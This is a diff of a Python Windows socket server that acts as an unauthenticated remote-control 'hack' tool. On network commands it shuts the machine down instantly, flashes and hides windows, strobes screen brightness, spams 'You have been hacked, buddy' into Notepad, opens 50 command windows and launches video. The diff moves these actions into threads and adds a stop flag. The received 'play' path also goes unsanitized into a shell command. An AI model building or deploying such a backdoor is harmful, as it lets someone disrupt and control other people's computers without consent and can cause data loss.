@@ -1,18 +1,22 @@
-
-
-
 import socket
 import subprocess
 import time
 import ctypes
+import threading
 import win32gui
 import win32con
 import pyautogui
 import screen_brightness_control as sbc
 
+# Global flag to stop attacks
+stop_flag = False
+
 def flash_screen():
+    global stop_flag
     try:
-        for _ in range(100):  # Flash 10 times
+        for _ in range(100):
+            if stop_flag:
+                break
             win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
             time.sleep(0.1)
             win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_SHOW)
@@ -21,8 +25,11 @@ def flash_screen():
         print(f"Error in flash_screen: {e}")
 
 def crazy_brightness():
+    global stop_flag
     try:
-        for _ in range(200):  # Loop to increase and decrease brightness
+        for _ in range(200):
+            if stop_flag:
+                break
             sbc.set_brightness(100)
             time.sleep(0.2)
             sbc.set_brightness(1)
@@ -30,60 +37,81 @@ def crazy_brightness():
     except Exception as e:
         print(f"Error in crazy_brightness: {e}")
 
+def play_video(video_path):
+    global stop_flag
+    try:
+        subprocess.run(f'start /MAX vlc "{video_path}"', shell=True)
+    except Exception as e:
+        print(f"Error playing video: {e}")
+
+def lol_attack():
+    global stop_flag
+    try:
+        subprocess.Popen("notepad.exe")
+        time.sleep(1)
+        for _ in range(500):
+            if stop_flag:
+                break
+            pyautogui.typewrite("You have been hacked, buddy")
+            pyautogui.press("enter")
+    except Exception as e:
+        print(f"Error in LOL attack: {e}")
+
+def cli_hack():
+    global stop_flag
+    try:
+        for _ in range(50):
+            if stop_flag:
+                break
+            subprocess.Popen(['cmd.exe', '/c', 'start', 'cmd.exe', '/K', 'cd / && color a && tree'], shell=False)
+            time.sleep(0.2)
+    except Exception as e:
+        print(f"Error in CLI Hack: {e}")
+
+def stop_all():
+    global stop_flag
+    stop_flag = True
+    print("[+] Stopping all hacks...")
+    subprocess.run("taskkill /IM vlc.exe /F", shell=True)
+    subprocess.run("taskkill /IM notepad.exe /F", shell=True)
+    subprocess.run("taskkill /IM cmd.exe /F", shell=True)
+
 def handle_client(client_socket):
+    global stop_flag
+    stop_flag = False  # Reset flag when a new connection is established
     try:
         print(f"[+] Connection from {client_socket.getpeername()}")
 
         while True:
             data = client_socket.recv(1024).decode().strip()
             if not data:
-                print("[-] No data received. Closing connection.")
                 break
 
             print(f"[+] Received: {data}")
 
             if data == "stopall":
-                print("[+] Stop command received. Restoring system...")
-                subprocess.run("taskkill /IM vlc.exe /F", shell=True)  # Stop VLC
-                break  # Exit loop
+                stop_all()
+                break  
 
             elif data.startswith("play "):
                 video_path = data.split(" ", 1)[1]
-                print(f"[+] Playing video: {video_path}")
-                subprocess.run(f'start /MAX vlc "{video_path}"', shell=True)
+                threading.Thread(target=play_video, args=(video_path,)).start()
 
             elif data == "shutdown":
-                print("[+] Shutdown command received. Shutting down system...")
-                subprocess.run("shutdown /s /t 0", shell=True)  # Instant shutdown
-                break
+                subprocess.run("shutdown /s /t 0", shell=True)
+                break  
 
             elif data == "lol":
-                print("[+] LOL mode activated! Opening Notepad and spamming text...")
-                subprocess.Popen("notepad.exe")
-                time.sleep(1)  # Give Notepad some time to open
-
-                for _ in range(500):
-                    pyautogui.typewrite("You have been hacked, buddy")
-                    pyautogui.press("enter")
-                
-                print("[+] LOL prank executed successfully!")
+                threading.Thread(target=lol_attack).start()
 
             elif data == "clihack":
-                print("[+] CLI Hack activated! Opening 50 separate CMD windows...")
-
-                for _ in range(50):  # Open 50 completely separate CMD windows
-                    subprocess.Popen(['cmd.exe', '/c', 'start', 'cmd.exe', '/K', 'cd / && color a && tree'], shell=False)
-                    time.sleep(0.2)  # Small delay to stagger openings
-
-                print("[+] CLI Hack executed successfully!")
+                threading.Thread(target=cli_hack).start()
 
             elif data == "flashscreen":
-                print("[+] Flash Screen activated!")
-                flash_screen()
+                threading.Thread(target=flash_screen).start()
 
             elif data == "crazybrightness":
-                print("[+] Crazy Brightness activated!")
-                crazy_brightness()
+                threading.Thread(target=crazy_brightness).start()
 
     except Exception as e:
         print(f"Error handling client: {e}")
@@ -99,7 +127,7 @@ def start_server():
 
     while True:
         client_socket, addr = server.accept()
-        handle_client(client_socket)
+        threading.Thread(target=handle_client, args=(client_socket,)).start()
 
 if __name__ == "__main__":
     start_server()
